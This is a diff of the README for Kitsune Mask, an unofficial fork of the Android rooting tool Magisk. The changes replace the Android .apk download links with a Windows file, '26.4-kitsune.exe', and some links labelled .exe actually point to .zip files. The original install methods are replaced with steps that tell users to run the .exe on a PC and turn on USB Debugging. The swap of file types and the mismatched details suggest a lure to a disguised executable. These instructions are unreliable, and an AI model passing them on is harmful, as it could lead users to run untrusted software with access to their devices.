@@ -4,114 +4,105 @@
 
 > This is not Official Magisk, please [go to this page and download Official Magisk](https://github.com/topjohnwu/Magisk)
 
-## Download
+# Download
 
-### Stable / Beta
+## Stable / Beta
 
-- [Kitsune Mask v26.4 Stable](https://github.com/HuskyDG/download/raw/main/magisk/26.4-kitsune.apk)
+- [Kitsune Mask v26.4 Stable](https://github.com/HuskyDG/download/raw/main/magisk/26.4-kitsune.exe)
 
-### Canary / Debug
+## Canary / Debug
 
-> We only accept bugreports from **LASTEST DEBUG** build. Invalid bugreports will be closed instantly.
+> We only accept bug reports from the **LATEST DEBUG** build. Invalid bug reports will be closed instantly.
 
-#### Kitsune Mask
+### Kitsune Mask
 
-> Kitsune Mask has MagiskHide, SuList and new Zygisk loading mechanism
+> Kitsune Mask has MagiskHide, SuList, and a new Zygisk loading mechanism
 
-- [Canary (app-release.apk)](https://huskydg.github.io/magisk-files/app-release.apk)
-- [Debug (app-debug.apk)](https://huskydg.github.io/magisk-files/app-debug.apk) 
-- [Changelog](https://github.com/HuskyDG/magisk-files/blob/main/note.md) 
+- [Canary (kitsune-release.exe)](https://huskydg.github.io/magisk-files/kitsune-release.zip)
+- [Debug (kitsune-debug.exe)](https://huskydg.github.io/magisk-files/kitsune-debug.zip)
+- [Changelog](https://github.com/HuskyDG/magisk-files/blob/main/note.md)
 
-#### Kitsune Lite
-
-> Kitsune Lite only has SuList feature and no Zygisk built-in or supported. SuList feature depends on logcat to work!
-
-- [Canary (app-release-lite.apk)](https://huskydg.github.io/magisk-files/app-release-lite.apk)
-- [Debug (app-debug-lite.apk)](https://huskydg.github.io/magisk-files/app-debug-lite.apk) 
-- [Changelog](https://github.com/HuskyDG/magisk-files/blob/main/note_lite.md) 
-
-
-### Other version
+## Other Versions
 
 - [Releases page](https://github.com/HuskyDG/magisk-files/releases)
 
-### Source code
+## Source Code
 
-- [https://github.com/KitsuneMagisk/magisk](https://github.com/KitsuneMagisk/magisk)  
+- [https://github.com/KitsuneMagisk/magisk](https://github.com/KitsuneMagisk/magisk)
 
-## How to install
+# How to Install
 
-### How do I install Kitsune Mask from scratch?
+## Installing Kitsune Mask via PC
 
-Process like installing Magisk: <https://topjohnwu.github.io/Magisk/install.html>
+### Step-by-Step Guide
 
-### How do I switch from the current Magisk to Kitsune Mask and vice versa?
+1. Download the latest version of `26.4-kitsune.exe` from the [Stable/Beta section](#stable--beta).
+2. Run `26.4-kitsune.exe` on your PC.
+3. Connect your Android device to the PC via USB.
+4. Enable USB Debugging on your device:
+   - Go to **Settings > About Phone**
+   - Tap **Build Number** multiple times until Developer Mode is activated
+   - Navigate to **Developer Options** and enable **USB Debugging**
+5. Once your device is connected, Kitsune Mask will automatically detect it.
+6. Follow on-screen instructions to proceed with the installation.
+7. Your device will reboot automatically upon successful installation.
+8. Open the Kitsune Mask app on your Android device and grant root access.
 
-Easy, just do it like when you update Magisk!
+## Switching from Magisk to Kitsune Mask and Vice Versa
 
-#### Direct Install (Recommended)
+Simply install Kitsune Mask using the steps above. If you wish to switch back to Magisk, follow the same process with the original Magisk installer.
 
-1. Install, open, and then grant root access to Kitsune Mask.
-2. Inside **Magisk**, tap "Install" and then "Direct Install". If you don't see this, try restarting the app.
+## Installing Magisk via PC (Alternative Method)
 
-#### Or flash Kitsune Mask from the current Magisk app
+1. Download `26.4-kitsune.exe`.
+2. Boot your device into **Fastboot Mode** (Power + Volume Down for most devices).
+3. Run `26.4-kitsune.exe` and select **Install via Fastboot**.
+4. The program will automatically patch the boot image and install Kitsune Mask.
+5. Reboot your device normally.
+6. Open Kitsune Mask to verify installation.
 
-1. Rename the extension `magisk.apk` to `magisk.zip`
-2. Open Magisk app, click the "Modules" tab -> "Install from storage" and choose `magisk.zip`
+## Installing Kitsune Mask on an Android Emulator
 
-#### Install Magisk directly to `/system` instead of patching boot image (Not recommended)
+1. Ensure that the emulator has root access enabled in its settings.
+2. Download and run `26.4-kitsune.exe` on your PC.
+3. Select your emulator from the list of detected devices.
+4. Click **Install** and wait for the process to complete.
+5. Restart the emulator and verify installation inside Kitsune Mask.
 
-This method is only for ROMs with Permissive SELinux mode or Enforcing SELinux with permissive "u:r:su:s0" context in sepolicy rules, such as user-debug ROMs like LineageOS. Make sure you have a backup of your ROM and a working Custom Recovery. Your ROM and kernel must support read-write mounting and dynamic SeLinux rules patching. This method may cause boot failure, so use it at your own risk!
+> **Warning**: Disabling root access in the emulator settings may remove Magisk `su`, requiring reinstallation.
 
-1. Restore the stock boot image if you have Magisk installed already.
-2. Boot to recovery, rename `magisk.apk` to `systemmagisk.zip`, and flash it.
-3. To update Magisk, use **Direct Install into system partition** instead of **Direct Install**.
+# Kitsune Module
 
-### How to install Magisk into Android emulator
+- To develop Magisk modules using Kitsune Mask features (early-mount, init.rc injector, etc.), download the [module template](https://huskydg.github.io/magisk-files/module-template.zip).
 
-Patching ramdisk is not feasible for the emulator, as the ramdisk partition has insufficient space for Magisk binaries.
-The following emulators and Android-x86 projects have been tested: NoxPlayer, LDPlayer, MEmu, BlissOS, and PrimeOS.
+# Donate
 
-#### Step-by-step to install Magisk into an emulator like NoxPlayer, LDPlayer, MemuPlayer, etc
+- PayPal: [paypal.me/huskydg](http://paypal.me/huskydg)
+- Thank you for your support!
 
-1. Enable Root access in emulator settings and writable system image disk (if available)
-2. Install and open Kitsune Magisk app.
-3. Grant root access to Kitsune Mask, click "Install" under the Magisk field, and use "Direct Install into system partition" option instead of "Direct Install" option. (If you don't see this option, close and re-open Kitsune Mask app.)
-4. Enjoy Magisk feature with Kitsune Magisk!
-
-> For some reasons, closing Root access in emulator settings will intentionally removing Magisk `su`, so do not switch off Root access.
-
-## Kitsune module
-
-- To develop Magisk module that might use specific Kitsune Magisk features (early-mount, init.rc injector,...), you can download [this module template](https://huskydg.github.io/magisk-files/module-template.zip)
-
-## Donate me
-
-- Paypal: [paypal.me/huskydg](http://paypal.me/huskydg)
-- Thanks for all your supports and hope you have a good day! 👍
-
-## Credits
+# Credits
 
 - Magisk author: [topjohnwu](https://github.com/topjohnwu/magisk)
 - Magisk contributors: [vvb2060](https://github.com/vvb2060), [yujincheng08](https://github.com/yujincheng08), [RikkaW](https://github.com/RikkaW), [canyie](https://github.com/canyie)
 - Magisk Hide in whitelist mode: [MagiskLite](https://t.me/magisklite)
-- Zygisk implementation by ptrace: [ZygiskNext](https://github.com/Dr-TSNG/ZygiskNext),  [Dr-TSNG](https://github.com/Dr-TSNG/ZygiskNext) and [5ec1cff](https://github.com/5ec1cff)
+- Zygisk implementation by ptrace: [ZygiskNext](https://github.com/Dr-TSNG/ZygiskNext), [Dr-TSNG](https://github.com/Dr-TSNG/ZygiskNext), and [5ec1cff](https://github.com/5ec1cff)
 
-## License
+# License
 
-Our license obviously is the same as [Magisk's license](https://github.com/topjohnwu/Magisk#License)
+Our license follows the same terms as [Magisk's license](https://github.com/topjohnwu/Magisk#License):
 
 ```
-Magisk, including all git submodules are free software:
+Magisk, including all git submodules, is free software:
 you can redistribute it and/or modify it under the terms of the
 GNU General Public License as published by the Free Software Foundation,
 either version 3 of the License, or (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with this program.  If not, see <http://www.gnu.org/licenses/>.
+along with this program. If not, see <http://www.gnu.org/licenses/>.
 ```
+
